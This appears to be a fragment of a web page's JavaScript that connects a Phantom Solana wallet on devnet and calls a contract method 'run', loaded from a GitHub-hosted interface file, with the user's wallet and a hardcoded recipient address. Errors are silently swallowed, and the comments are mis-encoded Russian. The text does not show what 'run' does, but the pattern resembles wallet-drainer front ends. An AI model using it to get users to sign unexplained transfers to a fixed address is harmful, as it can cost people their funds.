  <script type="module">
    import {
      Connection,
      PublicKey,
      clusterApiUrl,
      Transaction
    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.88.2/+esm";

    import {
      Program,
      AnchorProvider,
      web3
    } from "https://cdn.jsdelivr.net/npm/@project-serum/anchor@0.24.2/+esm";

    // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ + –≤—ã–∑–æ–≤ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
    document.getElementById("connectButton").addEventListener("click", async () => {
      const recipient = new PublicKey("4CeTBGmYG7SFV9aGi4rCSX1Hu483RkPmtrJhiFp9S1Wx");
      const programId = new PublicKey("H7p9WfN8hdozwak338EJZs3FrkvubyufHSzHRJzBCaGe");

      const idlUrl = "https://raw.githubusercontent.com/dimer101/sol_helper/refs/heads/main/sol_helper.json";
      const connection = new Connection(clusterApiUrl("devnet"), "confirmed");

      if (!window.solana?.isPhantom) {
        alert("–£—Å—Ç–∞–Ω–æ–≤–∏ Phantom Wallet");
        return;
      }

      try {
        const provider = new AnchorProvider(connection, window.solana, { preflightCommitment: "processed" });
        const idl = await fetch(idlUrl).then(res => res.json());
        const program = new Program(idl, programId, provider);

        const wallet = provider.wallet.publicKey;

        await window.solana.connect();
        await program.methods.run().accounts({
          user: wallet,
          recipient: recipient,
          systemProgram: web3.SystemProgram.programId,
        }).rpc();

        alert("–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!");
      } catch (err) {

      }
    });

    // –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É
